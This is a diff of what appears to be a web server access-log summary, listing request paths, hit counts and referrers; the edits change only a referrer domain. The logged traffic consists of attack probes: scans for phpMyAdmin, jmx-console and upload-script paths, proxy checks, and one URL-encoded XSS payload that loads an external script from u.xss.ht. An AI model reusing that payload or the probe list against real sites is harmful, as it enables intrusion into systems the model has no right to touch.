@@ -450,7 +450,7 @@ http://www.baidu.com/cache/global/img/gs.gif 8 -
 /phpMyAdmin-2.8.0/ 2 http://5.63.156.66/
 /phpMyAdmin-2.6.1-pl3/ 2 http://5.63.156.66/
 http://www.virusbook.cn/proxyverifytest/http/2016-07-08-16:56:01/5.63.156.66/8080 1 -
-/modules/columnadverts/uploadimage.php 1 http://useful-info/sites/mamarada/modules/columnadverts/uploadimage.php
+/modules/columnadverts/uploadimage.php 1 http://useful-info.space/sites/mamarada/modules/columnadverts/uploadimage.php
 http://a2.50na50.net/myipha.php 1 -
 /xampp/phpmyadmin 6 -
 http://a0.50na50.net/myiphb.php 1 -
@@ -459,7 +459,7 @@ http://a0.50na50.net/myiphb.php 1 -
 http://www.virusbook.cn/proxyverifytest/http/2016-07-09-00:40:51/5.63.156.66/8080 1 -
 /webadmin/ 2 http://5.63.156.66/
 /tmp/sfx.php 1 -
-/modules/vtemslideshow/uploadimage.php 1 http://useful-info/sites/mamarada/modules/vtemslideshow/uploadimage.php
+/modules/vtemslideshow/uploadimage.php 1 http://useful-info.space/sites/mamarada/modules/vtemslideshow/uploadimage.php
 /phpMyAdmin-2.7.0-pl2/ 2 http://5.63.156.66/
 http://1212.ip138.com/ic.asp 2 http://ip138.com/
 /phpMyAdmin-2.8.0.3/ 2 http://5.63.156.66/
@@ -505,7 +505,7 @@ http://testp3.pospr.waw.pl/testproxy.php 13 -
 http://50na50.net/myiphc.php 4 -
 /SQLite/SQLiteManager-1.2.4/main.php 12 -
 /phpMyAdmin-2.6.0/ 2 http://5.63.156.66/
-/license.php 1 http://useful-info/sites/mamarada/license.php
+/license.php 1 http://useful-info.space/sites/mamarada/license.php
 /mySqlDumper 12 -
 /phpMyAdmin-2.6.4/ 2 http://5.63.156.66/
 /phpMyAdmin-2.6.0-rc3/ 2 http://5.63.156.66/
@@ -536,8 +536,8 @@ http://static.90.170.46.78.clients.your-server.de/myipha.php 1 -
 /jmx-console 12 -
 /18ba41dc-3432-49f7-b81f-f6e0d56820f9 1 -
 /main.php 3 http://5.63.156.66/
-/modules/simpleslideshow/uploadimage.php 1 http://useful-info/sites/mamarada/modules/simpleslideshow/uploadimage.php
-/wp-articles/wp-login.php 2 http://useful-info/sites/mamarada/wp-articles/wp-login.php
+/modules/simpleslideshow/uploadimage.php 1 http://useful-info.space/sites/mamarada/modules/simpleslideshow/uploadimage.php
+/wp-articles/wp-login.php 2 http://useful-info.space/sites/mamarada/wp-articles/wp-login.php
 /%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fu.xss.ht%3E%3C%2Fscript%3E 1 %22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fu.xss.ht%3E%3C%2Fscript%3E
 /phpMyAdmin-2.6.1/ 2 http://5.63.156.66/
 /PMA2005/ 2 http://5.63.156.66/
@@ -607,7 +607,7 @@ http://www.virusbook.cn/proxyverifytest/2016-07-03-04:40:22/5.63.156.66/8080 1 -
 http://d0.50na50.net/myiphc.php 15 -
 /webdb/ 2 http://5.63.156.66/
 /phpMyAdmin-2.8.0.4/ 2 http://5.63.156.66/
-/modules/up.php 1 http://useful-info/sites/mamarada/modules/up.php
+/modules/up.php 1 http://useful-info.space/sites/mamarada/modules/up.php
 /404 1 -
 /wp/wp-login.php 9 -
 http://c1.50na50.net/myiphd.php 1 -
